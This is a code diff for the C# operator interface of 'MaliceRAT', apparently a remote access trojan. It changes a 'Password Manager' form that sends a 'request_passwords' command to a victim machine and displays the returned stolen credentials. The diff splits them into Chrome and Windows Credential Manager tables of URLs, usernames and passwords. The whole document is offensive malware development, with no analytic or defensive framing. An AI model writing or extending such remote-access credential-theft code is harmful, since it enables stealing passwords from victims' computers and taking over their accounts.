@@ -20,7 +20,7 @@ namespace MaliceRAT.RatUI
             this.victimId = victimId;
             this.server = server;
 
-            server.GetVictimById(victimId).Send(new { type = "request_passswords" });
+            server.GetVictimById(victimId).Send(new { type = "request_passwords" });
             server.MessageReceived += Server_MessageReceived;
 
             titleLabel.Text = $"Password Manager [{server.GetVictimById(victimId).User}]";
@@ -32,16 +32,23 @@ namespace MaliceRAT.RatUI
             {
                 if (message["type"] == "passwords")
                 {
-                    var passwords = new JavaScriptSerializer().Deserialize<List<CredentialModel>>(message["data"].ToString());
-                    gunaPasswordsTable.Invoke((MethodInvoker)delegate {
-                        gunaPasswordsTable.Rows.Clear();
-                        foreach (var password in passwords)
-                        {
-                            gunaPasswordsTable.Rows.Add(password.Url, password.Username, password.Password);
-                        }
-                    });
+                    var passwordData = new JavaScriptSerializer().Deserialize<PasswordData>(message["data"].ToString());
+
+                    UpdatePasswordTable(gunaChromePasswordsTable, passwordData.chrome);
+                    UpdatePasswordTable(gunaWCMPasswordsTable, passwordData.wcm);
                 }
             }
+        }
+
+        private void UpdatePasswordTable(DataGridView table, List<CredentialModel> passwords)
+        {
+            table.Invoke((MethodInvoker)delegate {
+                table.Rows.Clear();
+                foreach (var password in passwords)
+                {
+                    table.Rows.Add(password.Url, password.Username, password.Password);
+                }
+            });
         }
         #endregion
 
@@ -51,6 +58,12 @@ namespace MaliceRAT.RatUI
             public string Url { get; set; }
             public string Username { get; set; }
             public string Password { get; set; }
+        }
+
+        public class PasswordData
+        {
+            public List<CredentialModel> chrome { get; set; }
+            public List<CredentialModel> wcm { get; set; }
         }
         #endregion
     }
